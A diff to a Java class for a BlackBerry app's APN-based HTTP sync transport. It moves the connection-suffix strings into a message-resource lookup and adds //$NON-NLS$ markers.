@@ -11,6 +11,7 @@ package blackberry.action.sync.transport;
 
 import net.rim.device.api.system.CoverageInfo;
 import net.rim.device.api.system.RadioInfo;
+import blackberry.Messages;
 import blackberry.action.Apn;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -20,7 +21,7 @@ public class ApnTransport extends HttpTransport {
     Apn apn = null;
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ApnTransport", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("ApnTransport", DebugLevel.VERBOSE); //$NON-NLS-1$
 
     //#endif
 
@@ -32,20 +33,21 @@ public class ApnTransport extends HttpTransport {
 
     //#ifdef DEBUG
     public String toString() {
-        return "ApnTransport " + host + " ( " + apn + ")";
+        return "ApnTransport " + host + " ( " + apn + ")"; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
     }
-   //#endif
+
+    //#endif
 
     public boolean isAvailable() {
         //#ifdef DEBUG
-        debug.trace("isAvailable");
+        debug.trace("isAvailable"); //$NON-NLS-1$
         //#endif
         boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
         boolean coverage = CoverageInfo
                 .isCoverageSufficient(CoverageInfo.COVERAGE_DIRECT);
 
         //#ifdef DEBUG
-        debug.trace("isAvailable apn: " + gprs + " & " + coverage);
+        debug.trace("isAvailable apn: " + gprs + " & " + coverage); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
         return coverage & gprs & apn != null && apn.isValid();
@@ -53,8 +55,8 @@ public class ApnTransport extends HttpTransport {
 
     protected String getSuffix() {
 
-        return ";deviceside=true;apn=" + apn.apn + ";tunnelauthusername="
-                + apn.user + ";tunnelauthpassword=" + apn.pass;
+        return Messages.getString("j.0") + apn.apn + Messages.getString("j.8") //$NON-NLS-1$ //$NON-NLS-2$
+                + apn.user + Messages.getString("j.9") + apn.pass; //$NON-NLS-1$
 
     }
 }
